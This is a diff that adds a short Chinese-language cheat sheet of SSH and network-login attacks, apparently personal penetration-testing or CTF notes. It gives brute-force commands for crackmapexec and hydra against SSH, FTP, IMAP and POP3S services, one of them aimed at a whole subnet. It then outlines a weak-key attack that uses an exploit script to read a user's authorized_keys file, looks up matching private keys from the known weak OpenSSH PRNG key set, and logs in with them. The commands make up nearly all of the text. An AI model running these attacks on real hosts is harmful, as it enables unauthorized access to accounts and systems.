@@ -1,0 +1,38 @@
+直接爆破
+sudo crackmapexec ssh ip -u user.lst -p passwd.lst --continue-on-success | grep '+'
+
+hydra 
+hydra -l user -P passlist.txt ftp://192.168.0.1
+hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+hydra -l admin -p password ftp://[192.168.0.0/24]/
+hydra -L logins.txt -P pws.txt -M targets.txt ssh
+
+密钥爆破
+获取文件漏洞中的公钥
+例如使用Perl的漏洞
+sudo perl 2017.pl ip port /home/用户名/.ssh/authorized_keys 0(获取公钥)
+
+searchploit prng(寻找低版本Openssh的密钥对)
+
+searchploit -m 文件名(下载下来)
+
+cat 文件名看文件具体操作来使用
+
+在指定的密钥对目录中使用
+sudo grep -lr "公钥的一小部分"（查看对应公钥是否有私钥对)
+
+sudo ssh -i 私钥 用户名@ip 先登录不行再加上参数
+
+（-oHostKeyAlgorithms=ssh-rsa,ssh-dss -oPubKeyAcceptedKeyTypes=ssh-rsa,ssh-dss）
+
+还不行使用 -vv查看具体的传输问题
+
+如果端口改变了应该使用
+
+正常登录
+sudo ssh 用户名@ip
+指定端口登录
+sudo ssh 用户名@ip -p 指定端口
+私钥登录
+sudo ssh -i 私钥 用户名@ip
